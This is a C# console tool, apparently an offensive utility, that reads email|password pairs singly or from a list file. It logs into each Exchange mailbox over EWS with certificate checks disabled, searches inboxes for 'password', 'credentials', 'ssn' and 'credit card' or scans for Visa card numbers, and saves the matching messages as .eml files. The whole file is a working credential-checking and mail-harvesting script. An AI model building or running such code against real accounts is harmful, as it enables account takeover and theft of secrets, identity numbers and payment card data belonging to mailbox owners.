using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using Microsoft.Exchange.WebServices.Data;
using CommandLine;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Reflection;

//Install-Package CommandLineParser -Version 1.9.71
//Get-Project -All |Add-BindingRedirect

namespace ConsoleApp1
{
    class Program
    {
        class Options
        {
            [Option('u', "user", HelpText = "Email Address", Required = true)]
            public string userName { get; set; }

            [Option('p', "pass", HelpText = "Password", Required = true)]
            public string password { get; set; }

            [Option('f', "file", HelpText = "Text File (Email|Password) Per Line", Required = false)]
            public string inputFile { get; set; }

            [Option('k', "keyword", HelpText = "Text to Search", Required = false)]
            public string searchText { get; set; }

            [Option("pan", HelpText = "Find PAN numbers", DefaultValue = false, Required = false)]
            public bool pan { get; set; }

            [Option('d', HelpText = "Debug Mode", DefaultValue = false, Required = false)]
            public bool verbose { get; set; }

            [Option('h', "help", HelpText = "Print This Help Menu", Required = false, DefaultValue = false)]
            public bool Help { get; set; }
        }

        public static bool emailValid(string email)
        {
            return Regex.IsMatch(email, @"^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$");
        }

        public static void Main(string[] args)
        {

            List<string> lines = new List<string>();
            var options = new Options();
            if (CommandLine.Parser.Default.ParseArguments(args, options))
            {
            }
            if (options.Help)
            {
                Console.WriteLine(CommandLine.Text.HelpText.AutoBuild(options));
                return;
            }
            if (options.inputFile != null)
            {
                if (File.Exists(options.inputFile))
                {
                    string f = options.inputFile;
                    using (StreamReader r = new StreamReader(f))
                    {
                        string line;
                        while ((line = r.ReadLine()) != null)
                        {
                            lines.Add(line);
                        }
                    }
                }
            }
            else
            {
                if (options.userName != null && options.password != null)
                {
                    if (emailValid(options.userName).Equals(false))
                    {
                        Console.WriteLine("[!] Please enter a valid email address");
                        System.Environment.Exit(1);
                    }
                    else
                    {
                        lines.Add(options.userName + "|" + options.password);
                    }
                }
                else
                {
                    Console.WriteLine("[!] Please enter both username and password");
                    System.Environment.Exit(1);
                }
            }
            int splitCount = 0;
            if (lines.Count < 10)
            {
                if (lines.Count == 9)
                {
                    splitCount = (lines.Count / 9);
                }
                if (lines.Count == 8)
                {
                    splitCount = (lines.Count / 8);
                }
                if (lines.Count == 7)
                {
                    splitCount = (lines.Count / 7);
                }
                if (lines.Count == 6)
                {
                    splitCount = (lines.Count / 6);
                }
                if (lines.Count == 5)
                {
                    splitCount = (lines.Count / 5);
                }
                if (lines.Count == 4)
                {
                    splitCount = (lines.Count / 4);
                }
                if (lines.Count == 3)
                {
                    splitCount = (lines.Count / 3);
                }
                if (lines.Count == 2)
                {
                    splitCount = (lines.Count / 2);
                }
                if (lines.Count == 1)
                {
                    splitCount = (lines.Count / 1);
                }
            }
            else
            {
                splitCount = (lines.Count / 10);
            }
            List<string> Child = new List<string>();
            int count2 = 0;
            if (lines.Count == 1)
            {
                Child.Add(options.userName + "|" + options.password);
                accessEmail(Child, options);
            }
            else
            {
                foreach (var cred in lines)
                {
                    if (count2 < splitCount)
                    {
                        Child.Add(cred);
                        count2++;
                    }
                    else
                    {
                        Thread newThread = new Thread(() => accessEmail(Child, options));
                        newThread.Start();
                        Child = new List<string>();
                        count2 = 0;
                    }
                }
            }

        }

        //private static void accessEmail(string cred, Options options)
        private static void accessEmail(List<string> credList, Options options)
        {
            foreach (var cred in credList)
            {
                string[] creds = cred.Split('|');
                string username = creds[0];
                string password = creds[1].Trim();
                Console.WriteLine("\nChecking: " + username);
                if (username.Length == 0)
                {
                    Console.WriteLine("The username is empty");
                    System.Environment.Exit(1);
                }
                if (password.Length == 0)
                {
                    Console.WriteLine("The password is empty: " + username);
                }
                if (password.Length > 0 && username.Length > 0)
                {
                    char[] separatingChars = { '@' };
                    string[] filename = username.Split('@');
                    bool passPreReq = true;


                    //Set fake timezone to fix issue with Mono on OSX
                    string displayName = "(GMT+06:00) Antartica/Mawson Time";
                    string standardName = "Eastern Standard Time";
                    TimeSpan offset = new TimeSpan(06, 00, 00);
                    TimeZoneInfo mawson = TimeZoneInfo.CreateCustomTimeZone(standardName, offset, displayName, standardName);

                    ExchangeService service = new ExchangeService();

                    ServicePointManager.ServerCertificateValidationCallback = CertificateValidationCallback;
                    try
                    {
                        service = new ExchangeService(mawson);
                        service.EnableScpLookup = false;
                        service.Credentials = new WebCredentials(username, password);
                        service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                        SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                        FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));

                    }
                    catch (Exception e)
                    {
                        if (options.verbose == true)
                        {
                            Console.WriteLine(e);
                        }
                        try
                        {
                            service = new ExchangeService(ExchangeVersion.Exchange2007_SP1, mawson);
                            service.EnableScpLookup = false;
                            service.Credentials = new WebCredentials(username, password);
                            service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                            SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                            FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                        }
                        catch (Exception e1)
                        {
                            if (options.verbose == true)
                            {
                                Console.WriteLine(e1);
                            }
                            try
                            {
                                if (e1.Message.Contains("Microsoft.Exchange.WebServices.Data.ExchangeVersion"))
                                {
                                    service = new ExchangeService(ExchangeVersion.Exchange2013_SP1, mawson);
                                    service.EnableScpLookup = false;
                                    service.Credentials = new WebCredentials(username, password);
                                    service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                                    SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                                    FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                                }
                                else
                                {
                                    passPreReq = false;
                                    Console.WriteLine("Incorrect username or password: " + username);
                                }
                            }
                            catch (Exception e2)
                            {
                                if (options.verbose == true)
                                {
                                    Console.WriteLine(e2);
                                }
                                try
                                {
                                    if (e2.Message.Contains("Microsoft.Exchange.WebServices.Data.ExchangeVersion"))
                                    {
                                        service = new ExchangeService(ExchangeVersion.Exchange2013, mawson);
                                        service.EnableScpLookup = false;
                                        service.Credentials = new WebCredentials(username, password);
                                        service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                                        SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                                        FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                                    }
                                    else
                                    {
                                        passPreReq = false;
                                        Console.WriteLine("Incorrect username or password: " + username);
                                    }
                                }
                                catch (Exception e3)
                                {
                                    Console.WriteLine(e3);
                                    try
                                    {
                                        if (e3.Message.Contains("Microsoft.Exchange.WebServices.Data.ExchangeVersion"))
                                        {
                                            service = new ExchangeService(ExchangeVersion.Exchange2010_SP2, mawson);
                                            service.EnableScpLookup = false;
                                            service.Credentials = new WebCredentials(username, password);
                                            service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                                            SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                                            FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                                        }
                                        else
                                        {
                                            passPreReq = false;
                                            Console.WriteLine("Incorrect username or password: " + username);
                                        }
                                    }
                                    catch (Exception e4)
                                    {
                                        Console.WriteLine(e4);
                                        try
                                        {
                                            if (e4.Message.Contains("Microsoft.Exchange.WebServices.Data.ExchangeVersion"))
                                            {
                                                service = new ExchangeService(ExchangeVersion.Exchange2010_SP1, mawson);
                                                service.EnableScpLookup = false;
                                                service.Credentials = new WebCredentials(username, password);
                                                service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                                                SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                                                FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                                            }
                                        }
                                        catch (Exception e5)
                                        {
                                            Console.WriteLine(e5);
                                            if (e5.Message.Contains("Microsoft.Exchange.WebServices.Data.ExchangeVersion"))
                                            {
                                                service = new ExchangeService(ExchangeVersion.Exchange2010, mawson);
                                                service.EnableScpLookup = false;
                                                service.Credentials = new WebCredentials(username, password);
                                                service.AutodiscoverUrl(username, RedirectionUrlValidationCallback);
                                                SearchFilter searchFilter = new SearchFilter.IsEqualTo(FolderSchema.DisplayName, "Inbox");
                                                FindFoldersResults f = service.FindFolders(WellKnownFolderName.MsgFolderRoot, searchFilter, new FolderView(1));
                                            }
                                            else
                                            {
                                                passPreReq = false;
                                                Console.WriteLine("Incorrect username or password: " + username);
                                            }
                                        }
                                    }

                                }
                            }
                        }
                    }

                    if (passPreReq == true)
                    {
                        int i = 1;
                        if (options.verbose)
                        {
                            service.TraceEnabled = true;
                            service.TraceFlags = TraceFlags.All;
                        }
                        List<SearchFilter> searchFilterCollection = new List<SearchFilter>();
                        if (options.searchText != null)
                        {
                            searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, options.searchText, ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                        }
                        else
                        {
                            if (options.pan == false)
                            {
                                searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, "password", ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                                searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, "creds", ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                                searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, "credentials", ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                                searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, "ssn", ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                                searchFilterCollection.Add(new SearchFilter.SearchFilterCollection(LogicalOperator.Or, new SearchFilter.ContainsSubstring(ItemSchema.Body, "credit card", ContainmentMode.Substring, ComparisonMode.IgnoreCase)));
                            }
                            else
                            {
                                //Iterate through each mail in Inbox
                                Folder inbox = Folder.Bind(service, WellKnownFolderName.Inbox);
                                ItemView view = new ItemView(100);
                                FindItemsResults<Item> findResults2;
                                do
                                {
                                    findResults2 = service.FindItems(WellKnownFolderName.Inbox, view);
                                    foreach (var item in findResults2.Items)
                                    {
                                        PropertySet props2 = new PropertySet(EmailMessageSchema.Body);
                                        var email2 = EmailMessage.Bind(service, item.Id, props2);
                                        string sPattern = "\b4[0-9]{12}(?:[0-9]{3})?\b";
                                        //string sPattern = "^5[1-5][0-9]{14}$";
                                        //string sPattern = "[pP]assword";

                                        if (email2.Body.Text.Length > 0)
                                        {

                                            if (Regex.IsMatch(email2.Body.Text, sPattern))
                                            {
                                                Console.WriteLine("\n[PAN] PAN Number found in: " + filename[0] + "_" + "Inbox" + i + ".eml");

                                                string emlFilename = @filename[0] + "_" + "Inbox" + i + ".eml";
                                                ++i;
                                                PropertySet props = new PropertySet(EmailMessageSchema.MimeContent);
                                                var email = EmailMessage.Bind(service, item.Id, props);

                                                using (FileStream fs = new FileStream(emlFilename, FileMode.Create, FileAccess.Write))
                                                {
                                                    fs.Write(email.MimeContent.Content, 0, email.MimeContent.Content.Length);
                                                }

                                                ++i;
                                            }
                                        }
                                    }
                                    view.Offset = findResults2.NextPageOffset.Value;
                                } while (findResults2.MoreAvailable);
                            }
                        }
                        if (options.pan == false)
                        {
                            SearchFilter searchFilter = new SearchFilter.SearchFilterCollection(LogicalOperator.Or, searchFilterCollection.ToArray());

                            //Inbox					
                            FindItemsResults<Item> findResults = service.FindItems(
                                WellKnownFolderName.Inbox,
                                searchFilter,
                                new ItemView(999));

                            foreach (var item in findResults)
                            {
                                Console.WriteLine("[Subject]: " + item.Subject);
                                //Console.WriteLine(item.HasAttachments);
                                string emlFilename = @filename[0] + "_" + "Inbox" + i + ".eml";
                                ++i;
                                PropertySet props = new PropertySet(EmailMessageSchema.MimeContent);
                                var email = EmailMessage.Bind(service, item.Id, props);
                                Console.WriteLine("Writing to file: {0}\n", emlFilename);
                                using (FileStream fs = new FileStream(emlFilename, FileMode.Create, FileAccess.Write))
                                {
                                    fs.Write(email.MimeContent.Content, 0, email.MimeContent.Content.Length);
                                }
                            }
                        }
                    }
                }
            }
        }

        private static bool CertificateValidationCallback(
            object sender,
            System.Security.Cryptography.X509Certificates.X509Certificate certificate,
            System.Security.Cryptography.X509Certificates.X509Chain chain,
            System.Net.Security.SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private static bool RedirectionUrlValidationCallback(string redirectionUrl)
        {
            bool result = false;
            Uri redirectionUri = new Uri(redirectionUrl);
            if (redirectionUri.Scheme == "https")
            {
                result = true;
            }
            return result;
        }
    }
}